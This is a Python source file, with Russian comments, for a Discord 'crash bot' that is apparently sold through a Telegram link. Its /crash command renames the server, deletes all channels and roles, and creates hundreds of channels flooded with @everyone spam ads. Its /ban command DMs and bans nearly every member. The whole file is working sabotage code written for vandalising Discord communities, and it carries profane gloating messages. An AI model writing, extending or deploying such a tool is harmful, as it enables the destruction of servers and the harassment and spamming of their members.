import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os
from dotenv import load_dotenv

# Загружаем переменные из .env файла
load_dotenv()

# Берем токен из переменной окружения
TOKEN = os.getenv('DISCORD_TOKEN')
CHANNEL_NAME = 'crashed by .7ouh'  # Название для новых каналов
CHANNELS_COUNT = 200  # Количество каналов для создания
SPAM_MESSAGE = "@everyone вас отфакал сам <@1004905232284778516>\nкупить бота: https://t.me/crash7ouh"  # Сообщение для спама
SPAM_COUNT_PER_CHANNEL = 50  # Количество спам-сообщений в каждый канал
NEW_SERVER_NAME = "CRaSHEd by .7ouh"  # Новое имя сервера
BAN_MESSAGE = "ты был забанен на крашнутом сервере\nкупить крашбота: https://t.me/crash7ouh"  # Сообщение в ЛС перед баном

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)


@bot.event
async def on_ready():
    print(f'Бот {bot.user} запущен!')
    print(f'Серверов: {len(bot.guilds)}')

    # Синхронизируем слеш-команды
    try:
        synced = await bot.tree.sync()
        print(f"Синхронизировано {len(synced)} слеш-команд")
    except Exception as e:
        print(f"Ошибка синхронизации: {e}")

    await bot.change_presence(activity=discord.Game(name="/crash | /ban"))


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        try:
            await ctx.send("❌ У вас нет прав для использования этой команды!")
        except:
            print("Не удалось отправить сообщение о недостатке прав")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        print(f"Произошла ошибка: {error}")


# СЛЕШ-КОМАНДА /crash
@bot.tree.command(name="crash", description="Крашнуть сервер (удалить всё и создать каналы со спамом)")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(
    channels="Количество каналов для создания (макс 1000)",
)
async def crash_slash(interaction: discord.Interaction, channels: int = 200):
    """Главная команда для краша сервера"""

    if channels > 1000:
        await interaction.response.send_message("❌ Нельзя создать больше 1000 каналов за раз!", ephemeral=True)
        return

    await interaction.response.send_message("💥 **Запускаю краш сервера...**", ephemeral=True)

    guild = interaction.guild

    # Создаем временный канал для логов
    try:
        log_channel = await guild.create_text_channel("crash-log")
        await log_channel.send("💥 **CRASH РЕЖИМ АКТИВИРОВАН!**")
        await log_channel.send(
            f"📊 Настройки:\n• Каналов: {channels}\n• Сообщений на канал: {SPAM_COUNT_PER_CHANNEL}\n• Новое имя: {NEW_SERVER_NAME}\n• Запустил: {interaction.user.name}")
    except:
        log_channel = None

    try:
        # 1. МЕНЯЕМ НАЗВАНИЕ СЕРВЕРА
        try:
            await guild.edit(name=NEW_SERVER_NAME)
            if log_channel:
                await log_channel.send(f"✅ Название сервера изменено на: **{NEW_SERVER_NAME}**")
        except Exception as e:
            if log_channel:
                await log_channel.send(f"❌ Ошибка при изменении названия: {e}")

        # 2. УДАЛЯЕМ АВАТАРКУ СЕРВЕРА
        try:
            await guild.edit(icon=None)
            if log_channel:
                await log_channel.send("✅ Аватарка сервера удалена")
        except Exception as e:
            if log_channel:
                await log_channel.send(f"❌ Ошибка при удалении аватарки: {e}")

        # 3. УДАЛЯЕМ ВСЕ КАНАЛЫ параллельно
        if log_channel:
            await log_channel.send("🔄 Удаляю все каналы...")

        delete_tasks = []
        channel_types_count = {
            'text': len(guild.text_channels),
            'voice': len(guild.voice_channels),
            'category': len(guild.categories),
            'stage': len(guild.stage_channels),
            'forum': len(guild.forums)
        }

        for channel in guild.channels:
            if channel != log_channel:
                delete_tasks.append(channel.delete())

        if delete_tasks:
            await asyncio.gather(*delete_tasks, return_exceptions=True)

        if log_channel:
            await log_channel.send(
                f"✅ Удалено:\n"
                f"• Текстовых: {channel_types_count['text']}\n"
                f"• Голосовых: {channel_types_count['voice']}\n"
                f"• Категорий: {channel_types_count['category']}\n"
                f"• Трибун: {channel_types_count['stage']}\n"
                f"• Форумов: {channel_types_count['forum']}"
            )

        # 4. УДАЛЯЕМ ВСЕ РОЛИ
        if log_channel:
            await log_channel.send("🔄 Удаляю все роли...")

        # Сохраняем список ролей, которые нельзя удалить
        protected_roles = [guild.default_role]
        if guild.me:
            protected_roles.append(guild.me.top_role)

        # Удаляем все роли
        roles_deleted = 0
        for role in guild.roles:
            if role not in protected_roles and not role.managed and role.name != "@everyone":
                try:
                    await role.delete()
                    roles_deleted += 1
                    await asyncio.sleep(0.1)
                except:
                    pass

        if log_channel:
            await log_channel.send(f"✅ Удалено ролей: {roles_deleted}")
            await log_channel.send(f"📝 Создаю {channels} каналов и запускаю спам...")

        # 5. СОЗДАЕМ КАНАЛЫ И ПАРАЛЛЕЛЬНО СПАМИМ
        created_channels = []

        # Функция для спама в канал
        async def spam_channel(channel):
            for i in range(SPAM_COUNT_PER_CHANNEL):
                try:
                    await channel.send(SPAM_MESSAGE)
                    await asyncio.sleep(0.1)
                except Exception as e:
                    print(f"Ошибка спама в {channel.name}: {e}")
                    break

        # Создаем каналы пачками и сразу спамим
        batch_size = 5

        for i in range(0, channels, batch_size):
            create_tasks = []

            # Создаем пачку каналов
            for j in range(batch_size):
                if i + j < channels:
                    channel_name = f"{CHANNEL_NAME}-{i + j + 1}"
                    create_tasks.append(guild.create_text_channel(channel_name))

            # Создаем каналы параллельно
            channels_results = await asyncio.gather(*create_tasks, return_exceptions=True)

            # Для каждого созданного канала запускаем спам
            for result in channels_results:
                if not isinstance(result, Exception):
                    created_channels.append(result)
                    asyncio.create_task(spam_channel(result))

            # Обновляем прогресс в лог-канале
            if log_channel and (i + batch_size) % 20 == 0:
                await log_channel.send(f"✅ Создано {min(i + batch_size, channels)}/{channels} каналов...")

            await asyncio.sleep(0.5)

        await asyncio.sleep(2)

        # 6. ФИНАЛЬНЫЙ ОТЧЕТ
        if log_channel:
            await log_channel.send(
                f"✅ **ОПЕРАЦИЯ ЗАВЕРШЕНА!**\n• Создано каналов: {len(created_channels)}\n• Спам-сообщений на канал: {SPAM_COUNT_PER_CHANNEL}")

            await asyncio.sleep(5)
            try:
                await log_channel.delete()
            except:
                pass

        # Создаем финальный канал с результатом
        try:
            result_channel = await guild.create_text_channel("crash-complete")

            # Создаем эмбед с результатами
            result_embed = discord.Embed(
                title="💥 ПИЗДА СЕРВАКУ",
                color=discord.Color.red()
            )
            result_embed.add_field(name="📊 Статистика",
                                   value=f"• Новое имя сервера: {NEW_SERVER_NAME}\n"
                                         f"• Удалено ролей: {roles_deleted}\n"
                                         f"• Создано каналов: {len(created_channels)}\n"
                                         f"• Сообщений на канал: {SPAM_COUNT_PER_CHANNEL}\n"
                                         f"• Всего спам-сообщений: {len(created_channels) * SPAM_COUNT_PER_CHANNEL}",
                                   inline=False)
            result_embed.set_footer(text=f"by .7ouh | Запустил: {interaction.user.name}")

            await result_channel.send(embed=result_embed)
            await result_channel.send(f"@everyone **СЕРВЕР УСПЕШНО ВЫЕБАН!**")

        except Exception as e:
            print(f"Ошибка при создании финального канала: {e}")

    except Exception as e:
        print(f"Критическая ошибка: {e}")
        try:
            if log_channel:
                await log_channel.send(f"❌ Критическая ошибка: {e}")
            else:
                error_channel = await guild.create_text_channel("critical-error")
                await error_channel.send(f"❌ Ошибка: {e}")
        except:
            pass


# СЛЕШ-КОМАНДА /ban
@bot.tree.command(name="ban", description="Забанить всех участников сервера")
@app_commands.default_permissions(administrator=True)
@app_commands.describe(
    reason="Причина бана",
)
async def ban_all(interaction: discord.Interaction, reason: str = "Массовый бан от .7ouh"):
    """Банит всех участников сервера"""

    # Проверяем права
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("❌ У вас нет прав для использования этой команды!", ephemeral=True)
        return

    guild = interaction.guild
    await interaction.response.send_message("🔄 Начинаю массовый бан...", ephemeral=True)

    # Создаем лог-канал
    try:
        log_channel = await guild.create_text_channel("ban-log")
        await log_channel.send("🔨 МАССОВЫЙ БАН АКТИВИРОВАН")
    except:
        log_channel = None

    # Статистика
    banned_count = 0
    dm_sent_count = 0
    failed_count = 0

    # Получаем список участников (исключаем бота и админов)
    members_to_ban = []
    for member in guild.members:
        if member == guild.me:  # Не баним бота
            continue
        if member.guild_permissions.administrator and member != interaction.user:  # Не баним других админов
            continue
        members_to_ban.append(member)

    total_members = len(members_to_ban)

    if log_channel:
        await log_channel.send(f"Всего участников для бана: {total_members}")

    # Баним участников
    for i, member in enumerate(members_to_ban):
        try:
            # Отправляем ЛС перед баном
            try:
                await member.send(f"{BAN_MESSAGE}\nПричина: {reason}")
                dm_sent_count += 1
                await asyncio.sleep(0.5)
            except:
                pass

            # Баним участника
            await member.ban(reason=reason)
            banned_count += 1

            # Прогресс каждые 10 человек
            if (i + 1) % 10 == 0 and log_channel:
                await log_channel.send(f"Забанено {i + 1}/{total_members}")

            await asyncio.sleep(1)

        except Exception as e:
            failed_count += 1
            if log_channel:
                await log_channel.send(f"Ошибка бана для {member.name}: {e}")

    # Финальный отчет
    if log_channel:
        await log_channel.send(
            f"✅ ГОТОВО! Забанено: {banned_count}, ЛС отправлено: {dm_sent_count}, Ошибок: {failed_count}")
        await asyncio.sleep(10)
        try:
            await log_channel.delete()
        except:
            pass

    # Отправляем финальное сообщение админу
    try:
        await interaction.followup.send(
            f"✅ Массовый бан завершен!\nЗабанено: {banned_count}\nЛС отправлено: {dm_sent_count}\nОшибок: {failed_count}",
            ephemeral=True
        )
    except:
        pass


# Запуск бота
if __name__ == "__main__":
    bot.run(TOKEN)